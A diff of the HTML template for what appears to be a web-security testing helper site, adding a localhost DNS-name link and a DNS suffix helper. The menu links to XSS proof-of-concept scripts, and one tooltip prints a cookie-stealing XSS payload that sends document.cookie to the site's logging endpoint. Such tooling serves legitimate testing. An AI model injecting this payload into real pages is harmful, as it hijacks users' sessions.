@@ -586,6 +586,7 @@ Content-Type: text/html
                     <br>
                     <a href="/xss/jar.js" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Cookies XSS POC: a JavaScript file to inlcude which displays all cookies<br>For use on environments with restricted XSS capabilities')">cookies</a> <a href="/xss/localstorage.js" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('localStorage XSS POC, a JavaScript file to inlcude which displays all localStorage variables<br>For use on environments with restricted XSS capabilities')">local</a> <a href="/readrequest" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('sessionStorage XSS POC, a JavaScript file to inlcude which displays all sessionStorage variables<br>For use on environments with restricted XSS capabilities')">session</a><br>
                     <br>
+                    <br>
                     <a href="https://%s/settings" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Set some nice cookie sand other headers for using this site.')">User settings</a><br>                   
                 </div>    
             </div>
@@ -603,6 +604,7 @@ Content-Type: text/html
                     <a href="/htmldisplay/Connection%%3A%%20close%%0AContent-Type%%3A%%20text%%2Fplain%%0A%%0Aplain%%20text%%20example" onmouseout="clearDiv()" onmouseover="setTip('Serve a page of your chosing, inlcuding customisable HTTP headers (This example displays some text)')">Html diplay</a><br>
                     <br>
                     <br>
+                    <a href="http://127.0.0.1.dns.httpwn.org" onmouseout="clearDiv()" onmouseover="setTip('localhost DNS name')">IPv4 localhost DNS name</a><br>
                     <br>
                 </div>
             </div>
@@ -618,7 +620,7 @@ Content-Type: text/html
                     <br>
                     <script>
                         function xssTip()
-                        {
+                        { 
                             setTip('&ltscript&gt<br>var i = new Image();<br>i.src = "%s://%s/logrequest?q=" + escape(document.cookie);<br>&lt/script&gt', true);
                         }
                     </script>
@@ -626,6 +628,7 @@ Content-Type: text/html
                     <a href="#" onclick="hideAll();setTip('');show('htmldisplaytool');">Generate Html display url<br>
                     <br>
                     <a href="tools" target="_blank" onmouseout="clearDiv()" onmouseover="setTip('Page to en/decode various stuff');">En/Decoder tool<br>
+                    <a href="#" onclick="hideAll();setTip('.dns.httpwn.org', true);">DNS epilogue<br>
                     <br>
                 </div>                
             </div>
